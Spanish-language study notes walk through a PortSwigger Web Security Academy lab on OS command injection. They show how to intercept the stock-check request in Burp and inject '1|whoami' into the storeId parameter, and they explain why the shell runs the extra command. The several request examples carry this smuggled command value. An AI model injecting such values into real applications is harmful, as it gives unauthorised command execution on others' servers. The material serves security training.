# Lab — OS command injection, simple case

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Ejecutar el comando:

```text
whoami
```

mediante la función de comprobación de stock y observar en la respuesta el nombre del usuario del sistema operativo.

---

# Qué enseña este lab

La aplicación ejecuta un comando del sistema usando valores controlados por el usuario:

```text
productId
storeId
```

El parámetro vulnerable es:

```text
storeId
```

PortSwigger pide inyectar:

```text
1|whoami
```

---

# Procedimiento oficial paso a paso

## Paso 1 — Abrir un producto

1. Entrar al laboratorio.
2. Abrir cualquier producto con **View details**.
3. Localizar el botón **Check stock**.

---

## Paso 2 — Activar Intercept en Burp

Ir a:

```text
Proxy
→ Intercept
→ Intercept is ON
```

Volver al navegador y pulsar:

```text
Check stock
```

Burp debe detener una request parecida a:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

---

## Paso 3 — Identificar el parámetro vulnerable

En el body localizar:

```text
storeId=1
```

No hace falta modificar `productId`.

---

## Paso 4 — Inyectar `whoami`

Cambiar:

```text
storeId=1
```

por:

```text
storeId=1|whoami
```

La línea final debe verse conceptualmente así:

```text
productId=1&storeId=1|whoami
```

> Si Burp representa el carácter `|` mediante URL encoding, no confundir la representación con la lógica del payload. El valor que PortSwigger enseña es `1|whoami`.

---

## Paso 5 — Forward

Pulsar:

```text
Forward
```

La petición llegará al servidor con el payload modificado.

---

## Paso 6 — Observar la respuesta

PortSwigger indica que la aplicación devuelve la salida sin procesar del comando del sistema.

Debemos encontrar un nombre de usuario del servidor en la respuesta, por ejemplo conceptualmente:

```text
www-data
```

El valor concreto puede variar.

Cuando aparece el usuario actual, el lab queda resuelto.

---

# Qué está ocurriendo detrás

Conceptualmente la aplicación podría construir algo similar a:

```text
stockreport.pl PRODUCT STORE
```

Con valores normales:

```text
stockreport.pl 1 1
```

Con nuestra entrada:

```text
stockreport.pl 1 1|whoami
```

El shell interpreta `|` como sintaxis especial y termina ejecutando `whoami`.

La idea que debemos aprender es:

```text
HTTP parameter
      ↓
aplicación concatena valor
      ↓
comando del sistema
      ↓
shell interpreta metacaracteres
      ↓
comando adicional ejecutado
```

---

# Por qué `whoami`

`whoami` muestra el usuario bajo el cual se está ejecutando el proceso.

PortSwigger lo utiliza como prueba simple porque:

- no modifica el sistema;
- produce una salida corta;
- permite demostrar claramente ejecución de comandos.

---

# Proxy vs Repeater en este lab

La **solución oficial** dice:

```text
interceptar y modificar la request en Burp Suite
```

Por eso el workflow principal de estas notas usa:

```text
Proxy → Intercept
```

Después de completar el workflow oficial, opcionalmente se puede enviar la request a Repeater para practicar:

```text
Send to Repeater
```

pero no necesitamos Repeater para resolver el laboratorio.

---

# Request clave

Antes:

```http
POST /product/stock HTTP/2

productId=1&storeId=1
```

Después:

```http
POST /product/stock HTTP/2

productId=1&storeId=1|whoami
```

---

# Resultado esperado

```text
Response
↓
nombre del usuario del servidor
↓
Lab Solved
```

---

# Errores frecuentes

## Modificar el parámetro equivocado

El procedimiento oficial modifica:

```text
storeId
```

## Buscar una página `/whoami`

`whoami` no es una ruta web. Es un comando del sistema operativo ejecutado en el servidor.

## Pensar que `|` es texto normal

Dentro de un shell, `|` tiene significado especial. Esa es precisamente la razón por la que puede alterar el comando construido por la aplicación.

## Usar técnicas avanzadas innecesarias

No necesitamos Collaborator, time delays, redirección de archivos ni blind command injection en este lab.

---

# Checklist

- [ ] Abrí un producto.
- [ ] Activé `Proxy → Intercept`.
- [ ] Pulsé `Check stock`.
- [ ] Encontré `POST /product/stock`.
- [ ] Identifiqué `storeId`.
- [ ] Cambié el valor a `1|whoami`.
- [ ] Hice Forward.
- [ ] Encontré el nombre del usuario en la Response.
- [ ] El lab quedó Solved.

---

# Regla para recordar

```text
Entrada HTTP + shell sin validación
=
posible OS command injection
```
